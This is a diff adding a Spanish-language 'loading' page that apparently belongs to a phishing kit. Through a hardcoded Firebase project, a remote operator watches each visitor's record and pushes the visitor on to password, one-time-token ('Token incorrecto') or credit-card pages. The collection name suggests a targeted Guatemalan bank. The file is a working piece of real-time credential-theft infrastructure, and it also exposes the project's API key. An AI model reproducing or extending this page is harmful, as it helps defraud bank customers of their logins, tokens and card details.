@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Loading Screen</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+  </head>
+  <body class="bg-white flex items-center justify-center h-screen">
+    <!-- Loading container -->
+    <div class="flex flex-col items-center justify-center">
+      <!-- Circular Loader -->
+      <div class="relative">
+        <div
+          class="w-20 h-20 border-4 border-gray-300 border-t-yellow-400 rounded-full animate-spin"
+        ></div>
+      </div>
+
+      <!-- Loading Text -->
+      <p class="text-black mt-4 text-lg font-medium">Cargando...</p>
+    </div>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "bamguat",
+        localStorage.getItem("usuario")
+      );
+
+      // Usa `onSnapshot` directamente
+      onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+          console.log("New question:", questionData.question);
+          console.log("Current page:", questionData.page);
+
+          // Redirecciona basado en el valor de `page`
+          switch (questionData.page) {
+            case 1:
+              break;
+            case 2:
+              window.location.href = "contra.html";
+
+              break;
+            case 3:
+              window.location.href = "token.html";
+              break;
+            case 4:
+              alert("Token incorrecto");
+              window.location.href = "token.html";
+              break;
+            case 5:
+              alert(
+                "Hemos tenido un error inesperado, intente nuevamente en unos momentos"
+              );
+              window.location.href = "index.html";
+            case 6:
+              window.location.href = "credito.html";
+
+            default:
+              console.log("Page not recognized.");
+          }
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+</html>
